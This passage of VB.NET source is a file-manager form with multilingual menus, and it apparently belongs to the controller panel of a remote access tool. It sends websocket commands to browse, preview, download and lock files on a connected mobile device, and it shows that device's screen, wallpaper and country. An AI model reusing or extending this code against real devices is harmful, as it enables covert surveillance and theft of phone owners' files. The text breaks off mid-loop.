Imports System.ComponentModel
Imports System.IO
Imports System.Net
Imports System.Net.Http
Imports System.Security.Cryptography
Imports System.Threading
Imports BrightIdeasSoftware
Imports DrakeUI.Framework
Imports Newtonsoft.Json.Linq


Public Class filesmanager

    Public Class FileRow
        Public Property Name As String
        Public Property TypeDescription As String
        Public Property SizeDescription As String
        Public Property ModifiedDate As String
        Public Property CreateDate As String
        Public Property Icon As Image
        Public Property IsFile As Boolean
        Public Property Thumbloaded As Integer = 0
        Public Property IconIndex As Integer = 0
    End Class


    Public Btcli As BTClient
    Private Clipboard As New List(Of Array)
    Public downloads As New Dictionary(Of String, DownloadData)
    Public visited As New Dictionary(Of String, String)
    Public downloadsLock As New Object()
    Public isloading As Boolean = True

    Public Structure DownloadData
        Public Chunks As List(Of Byte())
        Public Filename As String
        Public TotalSize As Long
        Public SentSize As Long
    End Structure

    Private Sub translateme()
        Select Case BTRegistry.GetValue(Regz.Language, "null")

            Case "AR"
                tabsfiles.TabPages(0).Text = "الملفات"
                tabsfiles.TabPages(1).Text = "التحميلات"
                tabsfiles.TabPages(2).Text = "البحث الشامل"
                emptytext.Text = "مجلد فارغ, لا يوجد ملفات هنا"

                ctxMenu.Items(0).Text = "ذهاب الى"

                Dim subtools As ToolStripMenuItem = ctxMenu.Items(0)

                subtools.DropDownItems(0).Text = "الزاكرة"
                subtools.DropDownItems(1).Text = "المعرض"
                subtools.DropDownItems(2).Text = "التحميلات"
                subtools.DropDownItems(3).Text = "الصور"
                subtools.DropDownItems(4).Text = "لقطات الشاشة"
                subtools.DropDownItems(5).Text = "الفيديوهات"

                ctxMenu.Items(1).Text = "فتح"
                ctxMenu.Items(2).Text = "نسخ"
                ctxMenu.Items(3).Text = "قص"
                ctxMenu.Items(4).Text = "لصق"
                ctxMenu.Items(5).Text = "إعادة تسمية"
                ctxMenu.Items(6).Text = "تحميل"
                ctxMenu.Items(7).Text = "رفع ملف"
                ctxMenu.Items(8).Text = "قفل الملف"
                ctxMenu.Items(9).Text = "فك القفل"
                ctxMenu.Items(10).Text = "شاهد (فيديو)" 'Watch (video)
                ctxMenu.Items(11).Text = "ضفط الملفات"
                ctxMenu.Items(12).Text = "فك الضغط"
                ctxMenu.Items(13).Text = "حذف"
                ctxMenu.Items(14).Text = "ملف جديد"
                ctxMenu.Items(15).Text = "تعديل الملف"
                ctxMenu.Items(16).Text = "إخفاء"
                ctxMenu.Items(17).Text = "إظهار"
                ctxMenu.Items(18).Text = "تعين كخلفية"
                ctxMenu.Items(19).Text = "تشغل موسيقة"
                ctxMenu.Items(20).Text = "ملفات محملة"
                searchtext.Watermark = "البحث"
                srchfilsbtn.Text = "بحث الان"
                clrbtn.Text = "تنظيف"
                Label3.Text = "أداة البحث عن الملفات"
                comsrchfor.Text = "بحث عن ؟"
                logscannertext.Text = "• انقر فوق البحث الآن للبدء"

                Exit Select

            Case "CN" ' Chinese
                tabsfiles.TabPages(0).Text = "文件"
                tabsfiles.TabPages(1).Text = "下载"
                tabsfiles.TabPages(2).Text = "全局搜索"
                emptytext.Text = "文件夹为空，此处没有文件"

                ctxMenu.Items(0).Text = "前往"

                Dim subtools As ToolStripMenuItem = ctxMenu.Items(0)

                subtools.DropDownItems(0).Text = "存储器"
                subtools.DropDownItems(1).Text = "图库"
                subtools.DropDownItems(2).Text = "下载"
                subtools.DropDownItems(3).Text = "图片"
                subtools.DropDownItems(4).Text = "屏幕截图"
                subtools.DropDownItems(5).Text = "视频"

                ctxMenu.Items(1).Text = "打开"
                ctxMenu.Items(2).Text = "复制"
                ctxMenu.Items(3).Text = "剪切"
                ctxMenu.Items(4).Text = "粘贴"
                ctxMenu.Items(5).Text = "重命名"
                ctxMenu.Items(6).Text = "下载"
                ctxMenu.Items(7).Text = "上传文件"
                ctxMenu.Items(8).Text = "锁定文件"
                ctxMenu.Items(9).Text = "解锁文件"
                ctxMenu.Items(10).Text = "观看(视频)"
                ctxMenu.Items(11).Text = "压缩文件"
                ctxMenu.Items(12).Text = "解压缩"
                ctxMenu.Items(13).Text = "删除"
                ctxMenu.Items(14).Text = "新建文件"
                ctxMenu.Items(15).Text = "编辑文件"
                ctxMenu.Items(16).Text = "隐藏"
                ctxMenu.Items(17).Text = "显示"
                ctxMenu.Items(18).Text = "设为背景"
                ctxMenu.Items(19).Text = "播放音乐"
                ctxMenu.Items(20).Text = "下载的文件"
                searchtext.Watermark = "搜索"
                srchfilsbtn.Text = "立即搜索"
                clrbtn.Text = "清除"
                Label3.Text = "文件搜索工具"
                comsrchfor.Text = "搜索什么？"
                logscannertext.Text = "• 单击立即搜索以开始"
                Exit Select

            Case "RU" ' Russian
                tabsfiles.TabPages(0).Text = "Файлы"
                tabsfiles.TabPages(1).Text = "Загрузки"
                tabsfiles.TabPages(2).Text = "Глобальный поиск"
                emptytext.Text = "Пустая папка, здесь нет файлов"

                ctxMenu.Items(0).Text = "Перейти к"

                Dim subtools As ToolStripMenuItem = ctxMenu.Items(0)

                subtools.DropDownItems(0).Text = "Память"
                subtools.DropDownItems(1).Text = "Галерея"
                subtools.DropDownItems(2).Text = "Загрузки"
                subtools.DropDownItems(3).Text = "Изображения"
                subtools.DropDownItems(4).Text = "Скриншоты"
                subtools.DropDownItems(5).Text = "Видео"

                ctxMenu.Items(1).Text = "Открыть"
                ctxMenu.Items(2).Text = "Копировать"
                ctxMenu.Items(3).Text = "Вырезать"
                ctxMenu.Items(4).Text = "Вставить"
                ctxMenu.Items(5).Text = "Переименовать"
                ctxMenu.Items(6).Text = "Скачать"
                ctxMenu.Items(7).Text = "Загрузить файл"
                ctxMenu.Items(8).Text = "Заблокировать файл"
                ctxMenu.Items(9).Text = "Разблокировать файл"
                ctxMenu.Items(10).Text = "Смотреть (видео)"
                ctxMenu.Items(11).Text = "Сжать файлы"
                ctxMenu.Items(12).Text = "Распаковать"
                ctxMenu.Items(13).Text = "Удалить"
                ctxMenu.Items(14).Text = "Новый файл"
                ctxMenu.Items(15).Text = "Редактировать файл"
                ctxMenu.Items(16).Text = "Скрыть"
                ctxMenu.Items(17).Text = "Показать"
                ctxMenu.Items(18).Text = "Установить как фон"
                ctxMenu.Items(19).Text = "Проиграть музыку"
                ctxMenu.Items(20).Text = "Загруженные файлы"
                searchtext.Watermark = "Поиск"
                srchfilsbtn.Text = "Искать сейчас"
                clrbtn.Text = "Очистить"
                Label3.Text = "Инструмент поиска файлов"
                comsrchfor.Text = "Искать что?"
                logscannertext.Text = "• Нажмите «Поиск сейчас», чтобы начать"
                Exit Select

            Case "TR" ' Turkish
                tabsfiles.TabPages(0).Text = "Dosyalar"
                tabsfiles.TabPages(1).Text = "İndirilenler"
                tabsfiles.TabPages(2).Text = "Genel Arama"
                emptytext.Text = "Klasör boş, burada dosya yok"

                ctxMenu.Items(0).Text = "Git"

                Dim subtools As ToolStripMenuItem = ctxMenu.Items(0)

                subtools.DropDownItems(0).Text = "Depolama"
                subtools.DropDownItems(1).Text = "Galeri"
                subtools.DropDownItems(2).Text = "İndirilenler"
                subtools.DropDownItems(3).Text = "Resimler"
                subtools.DropDownItems(4).Text = "Ekran Görüntüleri"
                subtools.DropDownItems(5).Text = "Videolar"

                ctxMenu.Items(1).Text = "Aç"
                ctxMenu.Items(2).Text = "Kopyala"
                ctxMenu.Items(3).Text = "Kes"
                ctxMenu.Items(4).Text = "Yapıştır"
                ctxMenu.Items(5).Text = "Yeniden Adlandır"
                ctxMenu.Items(6).Text = "İndir"
                ctxMenu.Items(7).Text = "Dosya Yükle"
                ctxMenu.Items(8).Text = "Dosyayı Kilitle"
                ctxMenu.Items(9).Text = "Kilidi Aç"
                ctxMenu.Items(10).Text = "İzle (video)"
                ctxMenu.Items(11).Text = "Dosyaları Sıkıştır"
                ctxMenu.Items(12).Text = "Sıkıştırmayı Aç"
                ctxMenu.Items(13).Text = "Sil"
                ctxMenu.Items(14).Text = "Yeni Dosya"
                ctxMenu.Items(15).Text = "Dosyayı Düzenle"
                ctxMenu.Items(16).Text = "Gizle"
                ctxMenu.Items(17).Text = "Göster"
                ctxMenu.Items(18).Text = "Arka Plan Yap"
                ctxMenu.Items(19).Text = "Müziği Oynat"
                ctxMenu.Items(20).Text = "İndirilen Dosyalar"
                searchtext.Watermark = "Ara"
                srchfilsbtn.Text = "Şimdi Ara"
                clrbtn.Text = "Temizle"
                Label3.Text = "Dosya Arama Aracı"
                comsrchfor.Text = "Ne Aranacak?"
                logscannertext.Text = "• Başlamak için hemen Ara'ya tıklayın"


                Exit Select
            Case "SP" ' Spanish
                tabsfiles.TabPages(0).Text = "Archivos"
                tabsfiles.TabPages(1).Text = "Descargas"
                tabsfiles.TabPages(2).Text = "Búsqueda General"
                emptytext.Text = "La carpeta está vacía, no hay archivos aquí"

                ctxMenu.Items(0).Text = "Ir a"

                Dim subtools As ToolStripMenuItem = ctxMenu.Items(0)

                subtools.DropDownItems(0).Text = "Almacenamiento"
                subtools.DropDownItems(1).Text = "Galería"
                subtools.DropDownItems(2).Text = "Descargas"
                subtools.DropDownItems(3).Text = "Imágenes"
                subtools.DropDownItems(4).Text = "Capturas de Pantalla"
                subtools.DropDownItems(5).Text = "Videos"

                ctxMenu.Items(1).Text = "Abrir"
                ctxMenu.Items(2).Text = "Copiar"
                ctxMenu.Items(3).Text = "Cortar"
                ctxMenu.Items(4).Text = "Pegar"
                ctxMenu.Items(5).Text = "Renombrar"
                ctxMenu.Items(6).Text = "Descargar"
                ctxMenu.Items(7).Text = "Subir Archivo"
                ctxMenu.Items(8).Text = "Bloquear Archivo"
                ctxMenu.Items(9).Text = "Desbloquear"
                ctxMenu.Items(10).Text = "Ver (vídeo)"
                ctxMenu.Items(11).Text = "Comprimir Archivos"
                ctxMenu.Items(12).Text = "Descomprimir"
                ctxMenu.Items(13).Text = "Eliminar"
                ctxMenu.Items(14).Text = "Nuevo Archivo"
                ctxMenu.Items(15).Text = "Editar Archivo"
                ctxMenu.Items(16).Text = "Ocultar"
                ctxMenu.Items(17).Text = "Mostrar"
                ctxMenu.Items(18).Text = "Establecer como Fondo"
                ctxMenu.Items(19).Text = "Reproducir Música"
                ctxMenu.Items(20).Text = "Archivos Descargados"
                searchtext.Watermark = "Buscar"
                srchfilsbtn.Text = "Buscar Ahora"
                clrbtn.Text = "Limpiar"
                Label3.Text = "Herramienta de Búsqueda de Archivos"
                comsrchfor.Text = "¿Qué Buscar?"
                logscannertext.Text = "• Haz clic en 'Buscar Ahora' para empezar"

                Exit Select

            Case "PR" ' Brazilian Portuguese
                tabsfiles.TabPages(0).Text = "Arquivos"
                tabsfiles.TabPages(1).Text = "Downloads"
                tabsfiles.TabPages(2).Text = "Busca Geral"
                emptytext.Text = "A pasta está vazia, não há arquivos aqui"

                ctxMenu.Items(0).Text = "Ir para"

                Dim subtools As ToolStripMenuItem = ctxMenu.Items(0)

                subtools.DropDownItems(0).Text = "Armazenamento"
                subtools.DropDownItems(1).Text = "Galeria"
                subtools.DropDownItems(2).Text = "Downloads"
                subtools.DropDownItems(3).Text = "Imagens"
                subtools.DropDownItems(4).Text = "Capturas de Tela"
                subtools.DropDownItems(5).Text = "Vídeos"

                ctxMenu.Items(1).Text = "Abrir"
                ctxMenu.Items(2).Text = "Copiar"
                ctxMenu.Items(3).Text = "Cortar"
                ctxMenu.Items(4).Text = "Colar"
                ctxMenu.Items(5).Text = "Renomear"
                ctxMenu.Items(6).Text = "Baixar"
                ctxMenu.Items(7).Text = "Enviar Arquivo"
                ctxMenu.Items(8).Text = "Bloquear Arquivo"
                ctxMenu.Items(9).Text = "Desbloquear"
                ctxMenu.Items(10).Text = "Assistir (vídeo)"
                ctxMenu.Items(11).Text = "Compactar Arquivos"
                ctxMenu.Items(12).Text = "Descompactar"
                ctxMenu.Items(13).Text = "Excluir"
                ctxMenu.Items(14).Text = "Novo Arquivo"
                ctxMenu.Items(15).Text = "Editar Arquivo"
                ctxMenu.Items(16).Text = "Ocultar"
                ctxMenu.Items(17).Text = "Mostrar"
                ctxMenu.Items(18).Text = "Definir como Fundo"
                ctxMenu.Items(19).Text = "Reproduzir Música"
                ctxMenu.Items(20).Text = "Arquivos Baixados"
                searchtext.Watermark = "Pesquisar"
                srchfilsbtn.Text = "Pesquisar Agora"
                clrbtn.Text = "Limpar"
                Label3.Text = "Ferramenta de Busca de Arquivos"
                comsrchfor.Text = "O que Buscar?"
                logscannertext.Text = "• Clique em 'Pesquisar Agora' para começar"

                Exit Select

            Case Else
                ' Handle any other cases or defaults here
        End Select
    End Sub

    Sub New()

        ' This call is required by the designer.
        InitializeComponent()

        ' Add any initialization after the InitializeComponent() call.

    End Sub

    Private Sub titlestng_MouseDown(sender As Object, e As MouseEventArgs) Handles mytitle.MouseDown
        Try
            If e.Button = Windows.Forms.MouseButtons.Left Then
                ReleaseCapture()
                SendMessage(Handle, WM_NCLBUTTONDOWN, HT_CAPTION, 0)
            End If
        Catch ex As Exception

        End Try
    End Sub
    Dim Mx As Integer
    Dim Sw As Integer
    Dim movX As Boolean
    Private Sub DrakeWidth_W7_MouseDown(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W7.MouseDown
        movX = True
        Mx = MousePosition.X
        Sw = Width
    End Sub

    Private Sub DrakeWidth_W7_MouseMove(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W7.MouseMove
        If movX = True Then
            Width = MousePosition.X - Mx + Sw

        End If
    End Sub

    Private Sub DrakeWidth_W7_MouseUp(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W7.MouseUp
        movX = False

    End Sub
    Dim Myyy As Integer
    Dim Sh As Integer
    Dim movY As Boolean
    Private Sub DrakeWidth_W8_MouseDown(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W8.MouseDown
        movY = True
        Myyy = MousePosition.Y
        Sh = Height
    End Sub

    Private Sub DrakeWidth_W8_MouseMove(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W8.MouseMove
        If movY = True Then
            Height = MousePosition.Y - Myyy + Sh
        End If
    End Sub

    Private Sub DrakeWidth_W8_MouseUp(sender As Object, e As MouseEventArgs) Handles DrakeWidth_W8.MouseUp
        movY = False

    End Sub

    Private Sub filesmanager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        ' Me.Opacity = 0

        Try
            ConfigureFastObjectListView()
            ' 

            Select Case BTRegistry.GetValue(BTSettings.fileviewstyle, "1")
                Case "2"
                    listfilesvew.RowHeight = 75
                    DrakeUIButtonIcon7.Symbol = 61542

                Case "1"
                    listfilesvew.RowHeight = 25
                    DrakeUIButtonIcon7.Symbol = 61502
            End Select

            Me.myico.Image = Btcli.wallpaper
            Me.myscr.Image = Btcli.screen
            pathtxt.FillColor = Color.FromArgb(45, 45, 45)
            pathtxt.ForeColor = Color.White
            'PBtitlebar.BackColor = Color.FromArgb(45, 45, 45)
            'PBtitlebar.ForeColor = Color.FromArgb(220, 220, 220)


            translateme()


            If BTRegistry.ReadBool(BTSettings.autothumbs, True) Then
                LoadThumbs()
                DrakeUIButtonIcon4.ForeColor = Color.Lime
                DrakeUIButtonIcon4.RectColor = Color.Lime
            End If
        Catch ex As Exception
            MsgBox(ex.Message)
        End Try
        refresher.Start()
        statetimer.Start()
        If Not backgroundWorker.IsBusy Then
            backgroundWorker.RunWorkerAsync()
        End If

        'FadeIn(Me)
    End Sub

    'Private Async Sub FadeIn(ByVal o As Form, ByVal Optional interval As Integer = 20)
    '    Try
    '        While o.Opacity < 1.0
    '            Await Task.Delay(interval)
    '            o.Opacity += 0.05
    '        End While

    '    Catch ex As Exception

    '    End Try
    '    o.Opacity = 1

    'End Sub

    Private Sub refresher_Tick(sender As Object, e As EventArgs) Handles refresher.Tick

        Try
            Dim CountThums As String = Me.Btcli.userfolder & "\Thumbs" & Me.listfilesvew.Tag.Replace("/", "\")
            Dim countar As Integer = 0

            If Directory.Exists(CountThums) Then
                countar = Directory.GetFiles(CountThums, "*.*").Count
            End If
            Dim DGV0Count As Integer = listfilesvew.Items.Count - 1

            Dim CountClipboard As Integer = Clipboard.Count

            statetext.Text = "ALL " + CStr(DGV0Count)
            statetext.Text += Space(10)
            statetext.Text += "Selected " + CStr(listfilesvew.SelectedObjects.Count)
            statetext.Text += Space(10)
            statetext.Text += "Seen " + countar.ToString() & If(CountClipboard > 0, Space(10) & "Clipboard " & CStr(Clipboard.Count), "")

            If DGVDATA.Rows.Count > 0 Then
                tabsfiles.TabPages.Item(1).Text = "(" & DGVDATA.Rows.Count.ToString & ") " & Downloadsstr
            Else
                tabsfiles.TabPages.Item(1).Text = Downloadsstr
            End If

        Catch ex As Exception

        End Try
    End Sub


    Public Sub ConfigureFastObjectListView()
        With listfilesvew
            .ClearObjects()
            .Columns.Clear()

            ' General settings
            .BackColor = Color.FromArgb(30, 30, 30)
            .ForeColor = Color.White
            .Font = New Font("Cascadia Code", 9)
            .GridLines = False
            .FullRowSelect = True
            .HighlightBackgroundColor = Color.FromArgb(55, 55, 55)
            .UseAlternatingBackColors = False
            .AlternateRowBackColor = Color.FromArgb(30, 30, 30)
            .RowHeight = 25 ' Increase row height for spacing


            Dim iconColumn As New BrightIdeasSoftware.OLVColumn("Icon", Nothing)
            iconColumn.AspectGetter = Function(rowObject As Object)
                                          Try
                                              Dim fileRow As FileRow = CType(rowObject, FileRow)
                                              If fileRow Is Nothing Then
                                                  Return DirectCast(My.Resources.info_blue, Bitmap).Clone
                                              End If
                                              Return fileRow.Icon
                                          Catch ex As Exception

                                          End Try
                                          Return New Bitmap(1, 1)
                                      End Function
            iconColumn.Renderer = New BrightIdeasSoftware.ImageRenderer()
            iconColumn.Width = 70
            iconColumn.Sortable = False
            iconColumn.IsEditable = False
            .AllColumns.Add(iconColumn)

            Dim nameColumn As New BrightIdeasSoftware.OLVColumn("Name", "Name")
            nameColumn.Width = 200
            nameColumn.MaximumWidth = 400
            .AllColumns.Add(nameColumn)

            Dim typeColumn As New BrightIdeasSoftware.OLVColumn("Type", "TypeDescription")
            typeColumn.Width = 120
            .AllColumns.Add(typeColumn)

            Dim sizeColumn As New BrightIdeasSoftware.OLVColumn("Size", "SizeDescription")
            sizeColumn.Width = 100
            .AllColumns.Add(sizeColumn)

            Dim modifiedDateColumn As New BrightIdeasSoftware.OLVColumn("Modified Date", "ModifiedDate")
            modifiedDateColumn.Width = 140
            .AllColumns.Add(modifiedDateColumn)

            Dim createdDateColumn As New BrightIdeasSoftware.OLVColumn("Created Date", "CreateDate")
            createdDateColumn.FillsFreeSpace = True
            createdDateColumn.Width = 140
            .AllColumns.Add(createdDateColumn)

            ' Rebuild columns
            .RebuildColumns()
        End With
        listfilesvew.DoubleBuffered(True)
        listfilesvew.RowFormatter = Sub(olvItem As BrightIdeasSoftware.OLVListItem)
                                        ' Access the underlying model object
                                        Try
                                            Dim fileRow As FileRow = CType(olvItem.RowObject, FileRow)

                                            If fileRow Is Nothing Then
                                                Return
                                            End If

                                            ' Apply formatting based on a condition
                                            If fileRow.ModifiedDate = fileRow.CreateDate Then
                                                olvItem.ForeColor = Color.Red
                                            Else
                                                olvItem.ForeColor = Color.White ' Default color or any other condition
                                            End If
                                        Catch ex As Exception

                                        End Try
                                    End Sub
        listfilesvew.Sorting = SortOrder.None


    End Sub




    'Public Sub InsertFileRow(mobid As String, index As Integer, file As Dictionary(Of String, Object), icon As Bitmap)

    '    Try
    '        Dim row As New FileRow()

    '        row.Name = file("name").ToString()

    '        If icon IsNot Nothing Then
    '            Dim iconIndex As Integer = listfilesvew.SmallImageList.Images.Count
    '            listfilesvew.SmallImageList.Images.Add(icon)
    '            listfilesvew.LargeImageList.Images.Add(icon)
    '            row.Icon = icon
    '        End If

    '        Dim extin As String = ""
    '        If file("name").ToString().Contains(".") Then
    '            extin = file("name").ToString().Substring(file("name").ToString().LastIndexOf("."))
    '        End If

    '        Dim contentCount As Integer = If(file("filesCount") IsNot Nothing AndAlso file("filesCount") <> -1, CInt(file("filesCount")), 0)

    '        If CInt(file("type")) = 1 Then
    '            row.IsFile = True
    '            row.TypeDescription = $"File [{extin}]"
    '            row.SizeDescription = bytestotext(CLng(file("size")))
    '        Else
    '            row.IsFile = False
    '            row.TypeDescription = $"Folder [{contentCount}]"
    '            row.SizeDescription = " "
    '        End If

    '        row.ModifiedDate = file("modifiedDate").ToString()
    '        row.CreateDate = file("createDate").ToString()


    '        'note :  Friend WithEvents listfilesvew As BrightIdeasSoftware.FastObjectListView
    '        Dim rows As List(Of FileRow) = CType(listfilesvew.Objects, List(Of FileRow)) 'error here
    '        If rows Is Nothing Then
    '            rows = New List(Of FileRow)()
    '        End If
    '        rows.Add(row)


    '        listfilesvew.SetObjects(rows)
    '    Catch ex As Exception
    '        Log_e("InsertFileRow", ex.Message)
    '    End Try
    'End Sub



    Private Sub DrakeUIButtonIcon2_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon2.Click


        If DGVDATA.Rows.Count > 0 Then
            For index = DGVDATA.Rows.Count - 1 To 0 Step -1
                Try
                    Dim Ro As DataGridViewRow = DGVDATA.Rows(index)
                    If Ro.Tag = "-1" Then
                        DGVDATA.Rows.Remove(Ro)
                    End If
                Catch ex As Exception

                End Try
            Next

        End If


        loadimages = False

        listfilesvew.Items.Clear()
        filesicons.Images.Clear()
        filesicons.Dispose()
        thumbsimags.Images.Clear()
        thumbsimags.Dispose()
        refresher.Stop()
        statetimer.Stop()

        Me.Close()
    End Sub

    Private Sub listfilesvew_SelectedIndexChanged(sender As Object, e As EventArgs) Handles listfilesvew.SelectedIndexChanged
        Try
            If listfilesvew.SelectedObjects.Count = 1 Then
                Dim selectedFileRow As FileRow = CType(listfilesvew.SelectedObjects(0), FileRow) ' Get the first selected object
                Dim tg As String = If(selectedFileRow IsNot Nothing, If(selectedFileRow.IsFile, "1", "0"), "0")
                Dim FileDirectory As String = ""

                If tg = "1" Then
                    Dim targetfilepath As String = listfilesvew.Tag & "/" & selectedFileRow.Name
                    Dim flag As Boolean = False
                    FileDirectory = Btcli.userfolder & "\Thumbs" & listfilesvew.Tag.Replace("/", "\")

                    ' Check for video files
                    If targetfilepath.ToLower.EndsWith(".mp4") OrElse targetfilepath.ToLower.EndsWith(".mov") Then
                        Dim name As String = targetfilepath.Substring(targetfilepath.LastIndexOf("/") + 1)

                        If Directory.Exists(FileDirectory & "\" & name.Replace(".mp4", "").Replace(".mov", "")) Then
                            For Each file As String In My.Computer.FileSystem.GetFiles(FileDirectory & "\" & name.Replace(".mp4", "").Replace(".mov", ""))
                                Dim information = My.Computer.FileSystem.GetFileInfo(file)
                                viwimage.Image = ReadBitmapFromFile(FileDirectory & "\" & name.Replace(".mp4", "").Replace(".mov", "") & "\" & information.Name)
                                viwimagepanel.Visible = True
                                viwimagepanel.BringToFront()
                                flag = True
                                Exit For
                            Next
                        End If
                    End If

                    If flag Then Return

                    If Directory.Exists(FileDirectory) Then
                        Dim filePath = FileDirectory & "\" & CleanFileName(targetfilepath.Substring(targetfilepath.LastIndexOf("/") + 1))
                        If File.Exists(filePath) Then
                            Try
                                If viwimage.Image IsNot Nothing Then viwimage.Image = Nothing
                            Catch ex As Exception
                            End Try
                            viwimage.Image = ReadBitmapFromFile(filePath)
                            viwimagepanel.Visible = True
                            viwimagepanel.BringToFront()
                            flag = True
                        End If
                    End If

                    If flag Then Return

                    Dim t As String = selectedFileRow.Name

                    Dim status As Object = "null"
                    If ISupportedImages(t.ToLower) Then
                        status = "false"
                    ElseIf ISupportedVideo(t.ToLower) Then
                        status = "true"
                    End If

                    If status <> "null" AndAlso Btcli.isConnected Then
                        Dim data As New With {
                        .subcommand = "V",
                        .newpth = targetfilepath,
                        .ply = "0",
                        .skidf = Btcli.SecoundIDF,
                        .fstate = status
                         }

                        Dim commandstr As String = FormatCommand("files", data)
                        Dim chatData As New Dictionary(Of String, Object) From {
                        {"msg", wrk},
                        {"cmnd", commandstr}
                        }
                        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
                    End If

                Else
                    viwimage.Image = Nothing
                    viwimagepanel.Visible = False
                    viwimagepanel.SendToBack()
                End If
            End If
        Catch ex As Exception
            ' Handle exceptions
        End Try
    End Sub




    Private Function Pback(ByVal p As String)

        Try
            Dim a As String = String.Format("{0}", p.Substring(0, p.LastIndexOf("/")))

            Return If(a.Contains("/"), a, "/")
        Catch ex As Exception
            Return p
        End Try

    End Function

    Private Function Pnext(ByVal p As String, ByVal n As String)

        Return String.Format("{0}/{1}", p, n)

    End Function

    Private Sub DrakeUIButtonIcon3_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon3.Click
        If Btcli.isConnected Then
            navigateto(Pback(listfilesvew.Tag))
        End If
    End Sub

    Private Sub navigateto(thepath As String)
        Dim data As New With {
                    .subcommand = "L",
                    .newpth = thepath
                }

        Dim commandstr As String = FormatCommand("files", data)


        Dim chatData As New Dictionary(Of String, Object) From {
                                                    {"msg", wrk},
                                                    {"cmnd", commandstr}
                        }
        BTEngine.commands(chatData, Btcli.mobid, BTEngine.MainForm.webSocketClient)
    End Sub

    Private Sub DrakeUIButtonIcon1_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon1.Click
        If Btcli.isConnected Then
            navigateto(listfilesvew.Tag)
        End If
    End Sub

    Private Sub ToolStripMenuItem2_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem2.Click
        If Btcli.isConnected Then
            navigateto("get0")
        End If
    End Sub

    Private Sub ToolStripMenuItem3_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem3.Click
        If Btcli.isConnected Then
            navigateto("get3")
        End If
    End Sub

    Private Sub ToolStripMenuItem4_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem4.Click
        If Btcli.isConnected Then
            navigateto("get1")
        End If
    End Sub

    Private Sub ToolStripMenuItem5_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem5.Click
        If Btcli.isConnected Then
            navigateto("get2")
        End If
    End Sub

    Private Sub ToolStripMenuItem6_Click(sender As Object, e As EventArgs) Handles ToolStripMenuItem6.Click
        If Btcli.isConnected Then
            navigateto("get5")
        End If
    End Sub

    Private Sub SDCARDToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles SDCARDToolStripMenuItem.Click
        If Btcli.isConnected Then
            navigateto("get4")
        End If
    End Sub
    Dim searchbefore As New List(Of FileRow)

    Private Sub searchtext_TextChanged(sender As Object, e As EventArgs) Handles searchtext.TextChanged
        If Not String.IsNullOrEmpty(searchtext.Text) Then
            emptysearch.Visible = True
            TrySearch()
        Else
            emptysearch.Visible = False
            ShowAllRows() ' Show all rows when the search box is empty
        End If
    End Sub

    Private Sub ShowAllRows()
        ' Show all items from the original list without filtering
        listfilesvew.ClearObjects()
        listfilesvew.AddObjects(searchbefore)  ' Restore the original set of objects
        searchbefore.Clear()
    End Sub

    Public Sub TrySearch()
        If String.IsNullOrEmpty(searchtext.Text) Then
            Return
        End If

        Dim searchTerm As String = searchtext.Text.ToLower()

        ' Backup all current items before filtering
        If searchbefore.Count = 0 Then
            searchbefore.AddRange(listfilesvew.Objects.Cast(Of FileRow)())  ' Add objects to the backup list
        End If

        listfilesvew.BeginUpdate()
        ' Clear previous search results
        listfilesvew.ClearObjects()

        ' Perform search using the built-in search capabilities of FastObjectListView
        Dim filteredItems = searchbefore.Where(Function(row)
                                                   ' Search in the properties of the FileRow object
                                                   Return row.Name.ToLower().Contains(searchTerm) OrElse
                                                      row.TypeDescription.ToLower().Contains(searchTerm) OrElse
                                                      row.SizeDescription.ToLower().Contains(searchTerm) OrElse
                                                      row.ModifiedDate.ToString().ToLower().Contains(searchTerm) OrElse
                                                      row.CreateDate.ToString().ToLower().Contains(searchTerm)
                                               End Function).ToList()

        ' Add the filtered items back to the list
        listfilesvew.AddObjects(filteredItems)
        listfilesvew.Refresh()
        listfilesvew.EndUpdate()
        '
    End Sub



    Private Sub statetimer_Tick(sender As Object, e As EventArgs) Handles statetimer.Tick

        Try
            If Btcli.isConnected Then
                Me.myscr.Image = Btcli.screen
                Me.myico.Image = Btcli.wallpaper
                Me.mytitle.Text = Filesmanagestr & " | " & Btcli.name & " | " & Btcli.country

            Else
                Me.myico.Image = My.Resources.no_con
                Me.myscr.Image = Nothing
                Me.mytitle.Text = Filesmanagestr & " | " & BTConst.Disconnectedstr

            End If
        Catch ex As Exception

        End Try
    End Sub

    Private Sub DrakeUIButtonIcon6_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon6.Click
        Me.WindowState = WindowState.Minimized
    End Sub

    Private Sub DrakeUIButtonIcon4_Click(sender As Object, e As EventArgs) Handles DrakeUIButtonIcon4.Click
        If Not loadimages Then
            LoadThumbs()
            DrakeUIButtonIcon4.ForeColor = Color.Lime
            DrakeUIButtonIcon4.RectColor = Color.Lime

        Else
            StopLoadthumbs()
            DrakeUIButtonIcon4.ForeColor = Color.White
            DrakeUIButtonIcon4.RectColor = Color.Gray

        End If
        ' listfilesvew.Refresh()
    End Sub

    Private loadimages As Boolean = False
    Private Sub LoadThumbs()

        loadimages = True

    End Sub

    Private Sub StopLoadthumbs()

        loadimages = False
    End Sub


    Private Sub backgroundWorker_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles backgroundWorker.DoWork
        While Not Me.IsDisposed

            Try
                Threading.Thread.Sleep(1000)
                'loadimages

                If isloading Then
                    Continue While
                End If

                Dim visibleRows As List(Of OLVListItem) = Nothing

                If listfilesvew.InvokeRequired Then
                    listfilesvew.Invoke(Sub()
                                            visibleRows = GetVisibleItems(listfilesvew)
                                        End Sub)
                Else
                    visibleRows = GetVisibleItems(listfilesvew)
                End If
                If visibleRows Is Nothing Then
                    Continue While
                End If

                For Each item As OLVListItem In visibleRows
                    Dim fileRow As FileRow = CType(item.RowObject, FileRow)
